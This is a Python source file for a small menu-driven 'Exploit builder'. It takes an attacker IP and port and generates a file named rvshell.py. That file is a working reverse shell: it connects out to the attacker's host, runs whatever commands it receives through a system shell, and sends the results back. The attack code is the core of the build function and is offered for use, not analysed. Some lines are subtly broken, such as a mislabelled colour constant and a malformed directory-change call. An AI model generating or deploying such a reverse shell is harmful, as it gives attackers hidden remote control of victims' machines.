from colorama import Fore, Style, init
from rich.console import Console
from rich.align import Align
from rich.text import Text
from rich.panel import Panel
from rich.columns import Columns

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.GREEN
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
BRIGHT = Style.BRIGHT

import os

console = Console()
init(autoreset=True)

output_folder = "output/"
PORT = "change this"
IP = "change this"

def build_menu():
    banner = Text.from_ansi(rf"""
            \
            /                                 />           
            \__+_____________________/\/\___/ /|
            ()______________________      / /|/\
                         /0 0  ---- |----    /---\
                        |0 o 0 ----|| - \ --|      \
                         \0_0/____/ |    |  |\      \
                                     \__/__/  |      \
                                              |       \
                                              |         \
                                              |__________|
""")
    current_exploits_available = Text.from_ansi(f"""
    [{RED}RVSHELL{RESET}]: 1
    [{RED}RAT{RESET}]: 0









""")
    
    console.print(
        Columns(
            [
                Panel(
                    banner,
                    style="bold red",
                    border_style="bold red",
                    title="Exploit builder",
                ),
                Panel(
                    current_exploits_available,
                    border_style="bold red",
                    title="Exploits Available",
                ),
            ],
            expand=True,
        )
    )
    
    menu_view = Text.from_ansi(f"""
    [{RED}PORT{RESET}] {PORT}
    [{RED}IP{RESET}] {IP}
    
""")
    console.print(
        Panel(menu_view, border_style="bold red", title="Settings")
    )

def port():
    global PORT
    PORT = input(f"[{RED}PORT{RESET}] {RED}>{RESET} ")

def ip():
    global IP
    IP = input(f"[{RED}IP{RESET}] {RED}>{RESET} ")

def build():
    output = f"""\
import socket, subprocess, os

HOST = "{IP}"
PORT = {PORT}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
while True:
    s.send(f"{{os.getcwd()}}>".encode())
    cmd = s.recv(1024).decode()
    if cmd.startswith("cd "):
        os.chdir(cmd.strip("cd ")).strip()
        continue
    output = subprocess.run(cmd,shell=True,
                            capture_output=True)
    s.send(output.stdout + output.stderr)

"""
    os.makedirs("output", exist_ok=True)
    with open("output/rvshell.py", "w") as f:
        f.write(output)
        print(f"[{GREEN}+{RESET}] Succesfully generated rvshell")